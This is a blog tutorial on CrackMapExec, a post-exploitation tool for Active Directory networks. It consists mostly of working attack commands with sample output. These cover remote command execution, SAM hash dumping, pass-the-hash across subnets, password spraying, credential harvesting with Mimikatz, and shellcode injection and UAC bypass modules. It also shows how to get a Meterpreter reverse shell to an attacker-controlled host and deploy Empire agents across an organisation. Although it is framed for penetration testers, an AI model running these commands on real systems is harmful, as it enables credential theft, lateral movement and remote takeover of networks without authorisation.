
##
#
https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/
#
##

CrackMapExec - Ultimate Guide
2019/12/16
CrackMapExec | Windows | Pentest | Domain |
RedTeam
CrackMapExec

CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of “Living off the Land”: abusing built-in Active Directory features/protocols to achieve it’s functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.

Although meant to be used primarily for offensive purposes (e.g. red teams), CME can be used by blue teams as well to assess account privileges, find possible misconfigurations and simulate attack scenarios.

CrackMapExec is developed by @byt3bl33d3r
For installation Check the GitHub Repo GIFs from dev’s site
Network Enumeration

The first thing you want to do is just find out what’s on the network:

Command Execution

Executing commands on a windows system requires Administrator credentials, CME automatically tells you if the credential set you’re using has admin access to a host by appending ‘(Pwn3d!)’ to the output when authentication is successful.

Execution Methods

CME has three different command execution methods:

    wmiexec executes commands via WMI
    atexec executes commands by scheduling a task with windows task scheduler
    smbexec executes commands by creating and running a service

By default CME will fail over to a different execution method if one fails. It attempts to execute commands in the following order:

    wmiexec
    atexec
    smbexec

If you want to force CME to use only one execution method you can specify which one using the –exec-method flag.
Executing commands

In the following example, we try to execute whoami on the target using the -x flag:

#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
06-05-2016 14:34:35 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
06-05-2016 14:34:35 CME          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
06-05-2016 14:34:39 CME          192.168.10.11:445 WIN7BOX         [+] Executed command 
06-05-2016 14:34:39 CME          192.168.10.11:445 WIN7BOX         lab\administrator
06-05-2016 14:34:39 [*] KTHXBYE!

You can also directly execute PowerShell commands using the -X flag:

#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
06-05-2016 14:36:06 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
06-05-2016 14:36:06 CME          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         [+] Executed command 
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         Name                           Value
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         ----                           -----
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSVersion                      2.0
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           {1.0, 2.0}
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1
06-05-2016 14:36:10 [*] KTHXBYE!

Checked for logged in users

crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --lusers

Credential Attacks
Dumping the local SAM hashes

crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam

Passing-the-Hash

CME supports authenticating via SMB using Passing-The-Hash attacks with the -H flag:

crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH

crackmapexec smb <target(s)> -u username -H NTHASH

Passing-the-Hash against subnet

Login to all subnet machines via smb with admin + hash. By using the –local-auth and a found local admin password this can be used to login to a whole subnets smb enabled machines with that local admin pass/hash.

cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4ff0a6e8d9f4a61100e51' --local-auth

NULL Sessions

You can log in with a null session by using '' as the username and/or password

Examples:

crackmapexec smb <target(s)> -u '' -p ''

Brute Forcing & Password Spraying

We can do this by pointing crackmapexec at the subnet and passing the creds:

SMB Example

crackmapexec 10.0.2.0/24 -u ‘admin’ -p ‘P@ssw0rd' 

All protocols support brute-forcing and password spraying. For details on brute-forcing/password spraying with a specific protocol, see the appropriate wiki section.

By specifying a file or multiple values CME will automatically brute-force logins for all targets using the specified protocol:

Examples:

crackmapexec <protocol> <target(s)> -u username1 -p password1 password2

crackmapexec <protocol> <target(s)> -u username1 username2 -p password1

crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords

crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes

Modules

As of v3.1, the way modules are loaded and used has changed in an effort to make CME more portable and to enable it to be packaged.

With v4.0, each protocol can now have it’s own set of modules (fun fun fun!)

crackmapexec -L
[*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] rundll32_exec        Executes a command using rundll32 and Windows's native javascript interpreter
[*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
[*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
[*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
[*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
[*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
[*] powerview            Wrapper for PowerView's functions
[*] mimikittenz          Executes Mimikittenz
[*] enum_chrome          Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords
[*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] eventvwr_bypass      Executes a command using the eventvwr.exe fileless UAC bypass

Using a module

Run cme <protocol> <target(s)> -M <module name>.

For example to run the SMB Mimikatz module:

crackmapexec smb <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz

Viewing module options

cme <protocol> -M <module name> --options to view a modules supported options, e.g:

cme smb -M mimikatz --options

Using module options

Module options are specified with the -o flag. All options are specified in the form of KEY=value (msfvenom style)

Example:

cme <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'

Modules - MimiKatz

sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
CME          192.168.215.104:445 MEETINGROOM     [*] Windows 6.3 Build 9600 (name:MEETINGROOM) (domain:SE)
CME          192.168.215.104:445 MEETINGROOM     [+] MEETINGROOM\Administrator:PASS (Pwn3d!)
MIMIKATZ     192.168.215.104:445 MEETINGROOM     [+] Executed payload
MIMIKATZ                                       [*] Waiting on 1 host(s)
MIMIKATZ     192.168.215.104                   [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
MIMIKATZ                                       [*] Waiting on 1 host(s)
MIMIKATZ     192.168.215.104                   [*] - - "POST / HTTP/1.1" 200 -
MIMIKATZ     192.168.215.104                   [+] Found credentials in Mimikatz output (domain\username:password)
MIMIKATZ     192.168.215.104                   SE\Meeting:280778ddbb374ab9d2df719
MIMIKATZ     192.168.215.104                   SE\MEETINGROOM$:0bfa8060fc6c6d42d6ea124
MIMIKATZ     192.168.215.104                   SE\MEETINGROOM$:b245712b92126c953f203d6a
MIMIKATZ     192.168.215.104                   [*] Saved Mimikatz's output to Mimikatz-192.168.215.104-2018-01-02_144545.log
[*] KTHXBYE!

Modules - Enum_Chrome

sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M enum_chrome

Getting Shells with CrackMapExec
Metasploit

Metasploit Module - Metinject

cme -M metinject --show-options
[*] metinject module options:

            LHOST    IP hosting the handler
            LPORT    Handler port
            PAYLOAD  Payload to inject: reverse_http or reverse_https (default: reverse_https)
            PROCID   Process ID to inject into (default: current powershell process)

SMB to Meterpreter shell

sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=192.168.215.109 LPORT=5656 
Password:
CME          192.168.215.104:445 MEETINGROOM     [*] Windows 6.3 Build 9600 (name:MEETINGROOM) (domain:SE)
CME          192.168.215.104:445 MEETINGROOM     [+] MEETINGROOM\Administrator:PASS (Pwn3d!)
METINJECT    192.168.215.104:445 MEETINGROOM     [+] Executed payload
METINJECT                                      [*] Waiting on 1 host(s)
METINJECT    192.168.215.104                   [*] - - "GET /Invoke-Shellcode.ps1 HTTP/1.1" 200 -
[*] KTHXBYE!

Empire

Start RESTful API

 empire --rest --user empireadmin --pass gH25Iv1K68@^

[*] Loading modules from: /usr/local/Cellar/empire/1.5_1/libexec/lib/modules/
 * Starting Empire RESTful API on port: 1337
 * RESTful API token: 3brqi3nypvjzqgd269km091onaqc1t6kz8l1fclk
 * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)

Launch empire listener to target

sudo cme 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest
EMPIRE_EXEC                                    [+] Successfully generated launcher for listener 'CMETest'
CME          192.168.215.104:445 MEETINGROOM     [*] Windows 6.3 Build 9600 (name:MEETINGROOM) (domain:SE)
CME          192.168.215.104:445 MEETINGROOM     [+] MEETINGROOM\Administrator:PASSWORD (Pwn3d!)
EMPIRE_EXEC  192.168.215.104:445 MEETINGROOM     [+] Executed Empire Launcher

Teaming Up with Empire & DeathStar

CrackMapExec can deploy Empire agents to compromised machines. This makes further post-exploitation activities even easier, especially if using DeathStar’s automated attack capabilities. By using the empire_exec module and specifying the listener you want the agents to use, this will deploy and activate the agents en masse. All collected credentials can be imported into the CrackMapExec credential database. 

With all of these capabilities, CrackMapExec can make it easy for any pen tester or attacker to take a compromised computer and quickly spread through an organization with a few basic commands.
